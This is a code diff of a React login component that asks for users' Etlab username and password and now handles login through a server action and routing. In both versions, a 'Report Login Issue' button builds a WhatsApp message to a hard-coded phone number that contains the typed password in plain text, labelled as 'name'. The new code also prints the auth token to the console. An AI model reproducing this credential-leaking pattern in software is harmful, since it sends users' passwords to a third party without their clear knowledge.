@@ -3,161 +3,152 @@ import { Button } from './ui/button';
 import { useState, useEffect, useRef } from 'react';
 import { Input } from './ui/input';
 import { toast } from 'sonner';
+import { login } from '@/lib/actions/server';
+import { useRouter, usePathname } from 'next/navigation';
+import { useAuth } from '@/lib/hooks/useAuth';
 
-export default function LoginComponent() {
+export default function LoginComponent({ returnUrl }) {
     const [isLogged, setIsLogged] = useState('');
-    const [close, setClose] = useState(false);
-    const intervalRef = useRef(null);
     const [username, setUsername] = useState('');
     const [password, setPassword] = useState('');
     const [loading, setLoading] = useState(false);
-    const [isValidate, setIsValidate] = useState(false);
+    const [isOpen, setIsOpen] = useState(false);
+    const router = useRouter();
+    const pathname = usePathname();
+    const { setAuthToken, isAuthenticated } = useAuth();
 
-    const validateLogin = () => {
+    // Check if we're on the login page
+    const isLoginPage = pathname === '/login';
+
+    // Auto-open drawer if on login page and not already authenticated
+    useEffect(() => {
+        if (isLoginPage && !isAuthenticated && !isOpen) {
+            setIsOpen(true);
+        }
+    }, [isLoginPage, isAuthenticated, isOpen]);
+
+    // Check if already authenticated
+    useEffect(() => {
+        if (isAuthenticated) {
+            setIsLogged(true);
+        }
+    }, [isAuthenticated]);
+
+    const validateLogin = async () => {
         setLoading(true);
-        fetch('https://sstapi.pythonanywhere.com/accounts/api/login/', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                Accept: 'application/json',
-            },
-            body: JSON.stringify({
-                username: username,
-                password: password,
-            }),
-        })
-            .then((response) => response.json())
-            .then((data) => {
-                if (data.token) {
-                    localStorage.setItem('token', data.token);
-                    setLoading(false);
-                    setIsValidate(true);
-                } else if (data.non_field_errors) {
-                    setLoading(false);
-                    setIsValidate(false);
-                    toast('Wrong login', {
-                        description: 're-check your username and password !',
-                        action: {
-                            label: 'Close',
-                            onClick: () => {
-                                console.log('close');
-                            },
-                        },
-                    });
+        try {
+            const data = await login(username, password);
+            
+            if (data && data.token && data.token.token) {
+                console.log(data.token);
+                
+                // Use auth hook to set token
+                setAuthToken(data.token.token);
+                
+                // Show success toast
+                toast.success("Successfully logged in!");
+                
+                // Close drawer if it's open
+                setIsOpen(false);
+                
+                // Redirect to return URL or home
+                if (returnUrl) {
+                    router.push(decodeURIComponent(returnUrl));
+                } else {
+                    router.push('/');
                 }
-            })
-            .catch((err) => {
-                console.log(err);
-                setLoading(false);
-            });
+            } else {
+                // Show error toast
+                toast.error("Login failed. Please check your credentials.");
+            }
+        } catch (error) {
+            console.error("Login error:", error);
+            toast.error("An error occurred during login.");
+        } finally {
+            setLoading(false);
+        }
     };
 
-    useEffect(() => {
-        const localToken = localStorage.getItem('token');
-        if (localToken) {
-            setIsLogged(localToken);
-            setClose(true);
-        } else {
-            const fetchData = async () => {
-                try {
-                    const response = await fetch(`/api/token`, {
-                        method: 'GET',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            Accept: 'application/json',
-                        },
-                    });
+    // For login page, show a form directly instead of a drawer
+    if (isLoginPage) {
+        return (
+            <div className="w-full space-y-4">
+                <Input
+                    className="dark p-6 rounded-lg bg-gray-800 border-gray-700"
+                    type="text"
+                    value={username}
+                    onChange={(e) => setUsername(e.target.value)}
+                    placeholder="Etlab username"
+                />
+                <Input
+                    className="dark p-6 rounded-lg bg-gray-800 border-gray-700"
+                    type="password"
+                    value={password}
+                    onChange={(e) => setPassword(e.target.value)}
+                    placeholder="Etlab password"
+                />
+                <Button
+                    className="h-12 w-full bg-red-600 hover:bg-red-700 text-white py-4 mt-4 font-medium transition-colors"
+                    onClick={() => {
+                        if (username !== '' && password !== '') validateLogin();
+                    }}
+                >
+                    {loading ? 'Loading...' : 'Login'}
+                </Button>
+            </div>
+        );
+    }
 
-                    const data = await response.json();
-
-                    setIsLogged(data.token);
-                    console.log(data);
-                    if (data.token !== '') {
-                        setClose(true);
-                        clearInterval(intervalRef.current);
-                    }
-                } catch (error) {
-                    console.error(error);
-                }
-            };
-            fetchData();
-            intervalRef.current = setInterval(fetchData, 1000);
-        }
-        return () => {
-            clearInterval(intervalRef.current);
-        };
-    }, []);
-
+    // For other pages, show the drawer
     return (
-        <Drawer>
+        <Drawer open={isOpen} onOpenChange={setIsOpen}>
             <DrawerTrigger asChild>
-                <Button variant="outline" className="bg-red-600 text-white">
+                <Button className="bg-red-600 hover:bg-red-700 text-white font-medium px-6 py-2 rounded-lg h-14">
                     Login with Etlab
                 </Button>
             </DrawerTrigger>
             <DrawerContent className="dark">
-                <div className="h-[600px] w-full ">
-                    <DrawerHeader>
-                        <DrawerTitle>Login</DrawerTitle>
+                <div className="h-[600px] w-full max-w-md mx-auto">
+                    <DrawerHeader className="border-b border-gray-800 pb-4">
+                        <DrawerTitle className="text-2xl font-bold text-center">Login with Etlab</DrawerTitle>
                     </DrawerHeader>
-                    {close ? (
-                        <div className="flex flex-col items-center m-10 text-white">
-                            {isValidate ? (
-                                <>
-                                    <h1 className="text-2xl mb-5 text-white">Successfully registered & verified 🎉</h1>
-                                    <p className="text-1xl mb-5 text-white">
-                                        reload the page for viewing updated data.
-                                    </p>
-                                    <DrawerClose asChild>
-                                        <Button className="w-[300px]">Close</Button>
-                                    </DrawerClose>
-                                </>
-                            ) : (
-                                <>
-                                    <h1 className="text-2xl mb-5 text-white">Re-login for verification</h1>
-                                    <p className="text-1xl mb-5 text-white">
-                                        please dont change your password on etlab
-                                    </p>
-                                    <Input
-                                        className="dark mb-5"
-                                        type="text"
-                                        onChange={(e) => setUsername(e.target.value)}
-                                        placeholder="Etlab username"
-                                    />
-                                    <Input
-                                        className="dark mb-5"
-                                        type="password"
-                                        onChange={(e) => setPassword(e.target.value)}
-                                        placeholder="Etlab password"
-                                    />
-                                    <Button
-                                        className="w-full"
-                                        onClick={() => {
-                                            if (username !== '' && password !== '') validateLogin();
-                                        }}
-                                    >
-                                        {loading ? 'Loading' : 'Login'}
-                                    </Button>
-                                    <Button
-                                        className="mt-5 w-full"
-                                        onClick={() => {
-                                            window.open(
-                                                `whatsapp://send?phone=8075496634&text=Hi, i cant verify my account : ${username} name : ${password}`,
-                                            );
-                                        }}
-                                    >
-                                        Report Login Issue
-                                    </Button>
-                                </>
-                            )}
+                    <div className="flex flex-col items-center px-8 py-6 text-white">
+                        <div className="w-full space-y-4">
+                            <Input
+                                className="dark p-6 rounded-lg bg-gray-800 border-gray-700"
+                                type="text"
+                                onChange={(e) => setUsername(e.target.value)}
+                                placeholder="Etlab username"
+                            />
+                            <Input
+                                className="dark p-6 rounded-lg bg-gray-800 border-gray-700"
+                                type="password"
+                                onChange={(e) => setPassword(e.target.value)}
+                                placeholder="Etlab password"
+                            />
+                            <Button
+                                className="h-12 w-full bg-red-600 hover:bg-red-700 text-white py-4 mt-4 font-medium transition-colors"
+                                onClick={() => {
+                                    if (username !== '' && password !== '') validateLogin();
+                                }}
+                            >
+                                {loading ? 'Loading...' : 'Login'}
+                            </Button>
                         </div>
-                    ) : (
-                        <iframe
-                            src="https://clientuserlogin.onrender.com/?embedded=true"
-                            width={'100%'}
-                            height={'100%'}
-                        />
-                    )}
+                        <div className="w-full mt-auto pt-4">
+                            <Button
+                                variant="outline"
+                                className="w-full border-gray-600 text-gray-300 hover:bg-gray-800 py-4"
+                                onClick={() => {
+                                    window.open(
+                                        `whatsapp://send?phone=8075496634&text=Hi, i cant verify my account : ${username} name : ${password}`,
+                                    );
+                                }}
+                            >
+                                Report Login Issue
+                            </Button>
+                        </div>
+                    </div>
                 </div>
             </DrawerContent>
         </Drawer>
